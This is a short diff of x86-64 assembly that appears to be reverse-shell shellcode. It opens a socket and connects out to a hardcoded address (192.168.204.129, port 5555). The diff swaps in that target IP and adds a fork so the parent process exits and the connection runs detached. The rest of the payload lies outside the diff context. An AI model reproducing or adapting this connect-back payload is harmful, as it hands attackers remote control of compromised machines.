@@ -1,9 +1,15 @@
-BITS 64
+  BITS 64
 
 section .text
 
 global _start
 _start:
+
+mov rax, 0x39
+syscall
+
+cmp rax, 0
+jnz stop_father
 
 mov rax, 0x29
 mov rdi, 2
@@ -17,7 +23,7 @@ sub rsp, 16
 
 mov word [rsp], 2
 mov word [rsp+2], 0xb315
-mov dword [rsp+4], 0x99f1a8c0
+mov dword [rsp+4], 0x81cca8c0
 mov qword [rsp+8], 0
 
 mov rax, 0x2a
@@ -61,4 +67,10 @@ syscall
 
 mov rax,60
 mov rdi,0
+syscall
+
+
+stop_father:
+mov rax, 60
+mov rdi, 0
 syscall
